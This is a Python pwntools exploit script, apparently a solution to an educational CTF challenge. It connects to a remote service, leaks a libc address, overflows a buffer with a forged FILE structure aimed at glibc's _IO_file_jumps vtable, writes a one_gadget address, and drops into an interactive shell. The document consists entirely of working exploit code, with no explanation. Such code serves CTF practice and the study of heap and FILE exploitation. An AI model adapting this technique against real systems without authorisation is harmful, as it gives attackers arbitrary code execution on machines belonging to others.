from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

# r = process("./chal")
r = remote("edu-ctf.zoolab.org",30217)

l = ELF('../libc.so.6')

r.recvuntil("0x")
libc = int(r.recvline(),base=16) -  l.sym['printf']
_IO_file_jumps= libc + l.sym['_IO_file_jumps']
print("libc",hex(libc))
print("_IO_file_jumps",hex(_IO_file_jumps))

r.sendlineafter(">","1")
r.sendlineafter(">","2")


payload = flat(
    0,0,
    0,0,
    0,0,
    0,_IO_file_jumps + 0x20,
    _IO_file_jumps+0x28,0,
    0,0,
    0,0,
    0
)

r.sendlineafter("data>",b"A"*0x210+payload)
one_gadget =  libc + 0xe6c81
r.sendlineafter(">","4")
r.sendline(p64(one_gadget))

# gdb.attach(r)

r.interactive()

